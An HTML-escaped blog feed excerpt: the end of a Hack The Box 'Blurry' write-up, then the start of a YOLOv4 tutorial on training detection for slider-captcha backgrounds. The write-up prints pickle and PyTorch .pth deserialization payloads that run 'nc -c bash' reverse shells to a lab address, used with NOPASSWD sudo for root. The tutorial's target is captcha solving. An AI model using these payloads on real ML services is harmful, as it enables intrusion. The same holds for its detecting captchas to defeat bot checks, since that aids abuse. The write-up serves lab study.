we need to ensure consistency in the &lt;b&gt;project_name&lt;/b&gt; and &lt;b&gt;tags&lt;/b&gt; when testing with the PoC code.&lt;/p&gt;

&lt;!--
根据以上代码审计结果，我们在使用 Poc 代码进行测试需要对其进行确保 project_name 以及 tags 的一致。
--&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clearml&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Task&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;RunCommand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__reduce__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# Payload
&lt;/span&gt;        &lt;span class=&quot;nf&quot;&gt;return &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;echo Hacked by b0rg | nc 10.10.14.19 14443&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;RunCommand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;project_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Black Swan&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;task_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;TestNotMatchTaskName&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;tags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;review&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;project_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;upload_artifact&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;pickle_artifact&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;artifact_object&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;retries&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wait_on_upload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extension_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;.pkl&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Use &lt;b&gt;nc&lt;/b&gt; to listen and execute the PoC code.&lt;/p&gt;

&lt;p&gt;After waiting for Black Swan to repeat the “Review JSON Artifacts” task, we will see message echoing in the terminal.&lt;/p&gt;

&lt;!--
通过 nc 监听，并执行 Poc 代码。
等待 Black Swan 再次重复执行 &quot;Review JSON Artifacts&quot; 任务后，我们能看到终端出现了消息回显。
--&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-06-13-writeup-hackthebox-blurry/image-7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Modify the &lt;b&gt;Payload&lt;/b&gt; to turn the PoC code into Exploit code.&lt;/p&gt;

&lt;!--
修改 Payload 使 Poc 代码成为 Exploit 代码。
--&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nc &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; bash 10.10.14.19 14443&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Again, listen using &lt;b&gt;nc&lt;/b&gt;, and execute the exploit code to gain user permissions and obtain a reverse shell.&lt;/p&gt;

&lt;!--
再次通过 nc 监听，并执行 Exp 代码，获得用户权限反向 Shell。
--&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-06-13-writeup-hackthebox-blurry/image-8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;!--
--&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;

&lt;p&gt;Use &lt;b&gt;linpeas.sh&lt;/b&gt; for enumeration and collect information related to privilege escalation.&lt;/p&gt;

&lt;p&gt;The scan results show that the current user has an &lt;b&gt;SSH private key&lt;/b&gt;, which can be used for persistent access.&lt;/p&gt;

&lt;!--
使用 linpeas.sh 进行枚举，收集权限提升相关信息。
扫描结果显示当前用户存在 SSH 私钥，可用于持久化访问。
--&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-06-13-writeup-hackthebox-blurry/image-9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Another interesting piece of information is that the current user has &lt;b&gt;NOPASSWD sudo&lt;/b&gt; access.&lt;/p&gt;

&lt;!--
另一个有趣的信息是，当前用户存在 NOPASSWD 的 SUDO。
--&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-06-13-writeup-hackthebox-blurry/image-10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s take a look at the source code of &lt;b&gt;evaluate_model&lt;/b&gt;,&lt;br /&gt;
we can see that &lt;b&gt;evaluate_model&lt;/b&gt; actually calls the “&lt;b&gt;/models/evaluate_model.py&lt;/b&gt;” file.&lt;/p&gt;

&lt;!--
查看看 evaluate_model 的源码能发现 实际上调用了 &quot;/models/evaluate_model.py&quot; 文件。
--&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-06-13-writeup-hackthebox-blurry/image-11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking at the source code of &lt;b&gt;evaluate_model.py&lt;/b&gt;,&lt;br /&gt;
we can see that there is a step for loading the model,&lt;br /&gt;
which leads us to anticipate the presence of a &lt;b&gt;deserialization&lt;/b&gt; vulnerability.&lt;/p&gt;

&lt;!--
查看 evaluate_model.py 源码，其中存在模型加载的步骤，我们大致能够预判也是存在反序列化漏洞。
--&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-06-13-writeup-hackthebox-blurry/image-12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By constructing malicious model code,&lt;br /&gt;
we can generate a custom pth file containing a reverse shell.&lt;/p&gt;

&lt;!--
通过构造恶意的模型代码，我们能够生成包含反向 Shell 的自定义 pth 文件。
--&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;torch&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;torch.nn&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nn&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;torch.nn.functional&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Net&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Module&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;super&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Net&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;layer1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Linear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;layer2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Linear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;layer3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Linear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;forward&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;relu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;layer1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;relu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;layer2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;action&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;layer3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;action&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__reduce__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;return &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;nc -c bash 10.10.14.19 14443&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,))&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;__main__&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Net&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;torch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;getshell.pth&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Upload this code to the machine and execute it to generate the &lt;b&gt;getshell.pth&lt;/b&gt; file.&lt;br /&gt;
Then, listen using &lt;b&gt;nc&lt;/b&gt;, and execute the &lt;b&gt;NOPASSWD sudo&lt;/b&gt; exploit.&lt;/p&gt;

&lt;!--
上传该代码到机器上，执行生成 getshell.pth 文件。
通过 nc 监听，然后执行  NOPASSWD SUDO 利用。
--&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-06-13-writeup-hackthebox-blurry/image-13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Gain administrator privileges.&lt;/p&gt;

&lt;!--
获得管理员权限。
--&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-06-13-writeup-hackthebox-blurry/image-14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nice!&lt;/p&gt;
</description>
        <pubDate>Thu, 13 Jun 2024 16:01:35 +0800</pubDate>
        <link>https://b0rgch3n.github.io/2024/06/13/writeup-hackthebox-blurry/</link>
        <guid isPermaLink="true">https://b0rgch3n.github.io/2024/06/13/writeup-hackthebox-blurry/</guid>
        
        <category>WriteUp</category>
        
        <category>Hack The Box</category>
        
        
      </item>
    
      <item>
        <title>[Solutions] Object Detection 0 to 0.01: YOLOv4</title>
        <description>&lt;p&gt;The object recognition solution: YOLOv4.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;introduction&quot;&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Since achieving image text recognition through CNN in 2019, &lt;br /&gt;
my study and practice of neural networks have stagnated for a long time.&lt;/p&gt;

&lt;p&gt;So this time, I aim for a slightly more challenging target with object recognition: &lt;br /&gt;
letting the neural network find something in the images.&lt;/p&gt;

&lt;p&gt;The object recognition solution is actually quite simple: &lt;strong&gt;YOLOv4&lt;/strong&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;requirement&quot;&gt;&lt;strong&gt;Requirement&lt;/strong&gt;&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;Open source project: &lt;a href=&quot;https://github.com/AlexeyAB/darknet&quot;&gt;darknet - YOLOv4&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Annotation tool: &lt;a href=&quot;https://github.com/tzutalin/labelImg&quot;&gt;labelImg&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Reference: &lt;a href=&quot;https://github.com/AlexeyAB/darknet#how-to-train-to-detect-your-custom-objects&quot;&gt;How to train (to detect your custom objects)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;sample-preparation&quot;&gt;&lt;strong&gt;Sample Preparation&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;For the experiment, I chose to use a slider captcha developed by a well-known Chinese internet company for demonstration, because sliders are easy to recognize as targets.&lt;/p&gt;

&lt;p&gt;Traditional image processing (like &lt;strong&gt;Pillow&lt;/strong&gt;) does not work well for slider captcha recognition.&lt;/p&gt;

&lt;p&gt;Randomly select a type of slider captcha and download its background images in bulk.&lt;/p&gt;

&lt;p&gt;The selected samples for the current experiment have various situations, but the ultimate goal is to find all slider positions in the images.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2020-03-18-solutions-object-detection-0-to-001-yolov4/image-1.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;slide captcha background images&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The annotation of the images is roughly as follows.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2020-03-18-solutions-object-detection-0-to-001-yolov4/image-2.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;annotate object by labelImg&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The annotated information will be stored in &lt;strong&gt;.txt&lt;/strong&gt; files in &lt;strong&gt;YOLO format&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2020-03-18-solutions-object-detection-0-to-001-yolov4/image-3.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;annotation object data&lt;/em&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;data-preprocessing&quot;&gt;&lt;strong&gt;Data Preprocessing&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;First, understand the data-related files,&lt;br /&gt;
which can be divided into 6 categories, all stored in the “&lt;strong&gt;darknet\data&lt;/strong&gt;” directory.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Image samples containing objects (&lt;strong&gt;.\obj\xxx.jpg&lt;/strong&gt;)&lt;/li&gt;
  &lt;li&gt;Object annotation data corresponding to image samples (&lt;strong&gt;.\obj\xxx.txt&lt;/strong&gt;)
    &lt;ul&gt;
      &lt;li&gt;Text files with the same name as the image samples in the same folder&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Collection of training data paths (&lt;strong&gt;train.txt&lt;/strong&gt;)&lt;/li&gt;
  &lt;li&gt;Collection of prediction data paths (&lt;strong&gt;test.txt&lt;/strong&gt;)&lt;/li&gt;
  &lt;li&gt;Object classification (&lt;strong&gt;obj.names&lt;/strong&gt;)&lt;/li&gt;
  &lt;li&gt;Input data configuration (&lt;strong&gt;obj.data&lt;/strong&gt;)&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&quot;object-classification-objnames&quot;&gt;&lt;strong&gt;Object classification (obj.names)&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;Object classification is a text file,&lt;br /&gt;
with each line corresponding to a category name, and the line number being the index.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plain&quot; data-lang=&quot;plain&quot;&gt;target&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;image-samples--annotation-data-objxxxjpgtxt&quot;&gt;&lt;strong&gt;Image Samples &amp;amp; Annotation Data (.\obj\xxx.&amp;lt;jpg|txt&amp;gt;)&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;Each &lt;strong&gt;.jpg&lt;/strong&gt; image sample can contain multiple inspection objects, and the corresponding annotation data file &lt;strong&gt;.txt&lt;/strong&gt; will also contain the same number of inspection objects.&lt;/p&gt;

&lt;p&gt;Each &lt;strong&gt;.jpg&lt;/strong&gt; image sample corresponds to an annotation data &lt;strong&gt;.txt&lt;/strong&gt; file stored in the same directory.&lt;/p&gt;

&lt;p&gt;The annotation data format is one detection object per line:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;The &lt;strong&gt;class index&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;The midpoint of the bounding box on the &lt;strong&gt;x&lt;/strong&gt; and &lt;strong&gt;y&lt;/strong&gt; axes&lt;/li&gt;
  &lt;li&gt;The &lt;strong&gt;width&lt;/strong&gt; and &lt;strong&gt;height&lt;/strong&gt; of the bounding box&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/images/2020-03-18-solutions-object-detection-0-to-001-yolov4/image-4.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;annotation object format&lt;/em&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-plain&quot; data-lang=&quot;plain&quot;&gt;1 0.716797 0.395833 0.216406 0.147222
1 0.420312 0.395833 0.140625 0.166667&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The &lt;strong&gt;YOLO format&lt;/strong&gt; sample data generated by labelImg needs to be converted to the above format.&lt;/p&gt;

&lt;p&gt;For specific preprocessing, refer to “&lt;a href=&quot;https://github.com/AlexeyAB/darknet#how-to-train-to-detect-your-custom-objects&quot;&gt;How to train (to detect your custom objects)&lt;/a&gt;” point 5.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2020-03-18-solutions-object-detection-0-to-001-yolov4/image-5.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;yolov4 document&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Batch conversion can be achieved by modifying the official example script “&lt;a href=&quot;https://github.com/AlexeyAB/darknet/blob/master/scripts/voc_label.py&quot;&gt;/scripts/voc_label.py&lt;/a&gt;”.&lt;/p&gt;

&lt;p&gt;The final files in the &lt;strong&gt;obj&lt;/strong&gt; directory should look roughly like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2020-03-18-solutions-object-detection-0-to-001-yolov4/image-6.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;obj directory&lt;/em&gt;&lt;/p&gt;

&lt;h4 id=&quot;train--test-set-path-collection-traintxt--testtxt&quot;&gt;Train &amp;amp; Test Set Path Collection (train.txt &amp;amp; test.txt)&lt;/h4&gt;

&lt;p&gt;According to the official guide,&lt;br /&gt;
the dataset is divided into training and testing sets in a certain proportion,&lt;br /&gt;
and the relative paths of the images are stored in the &lt;strong&gt;train.txt&lt;/strong&gt; and &lt;strong&gt;test.txt&lt;/strong&gt; files.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2020-03-18-solutions-object-detection-0-to-001-yolov4/image-7.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;train.txt&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2020-03-18-solutions-object-detection-0-to-001-yolov4/image-8.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;test.txt&lt;/em&gt;&lt;/p&gt;

&lt;h4 id=&quot;input-data-configuration-objdata&quot;&gt;Input Data Configuration (obj.data)&lt;/h4&gt;

&lt;p&gt;Indicates model data set related information:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;classes&lt;/strong&gt;: The number of object categories&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;train&lt;/strong&gt;: The location of the train set path files&lt;/li&gt;
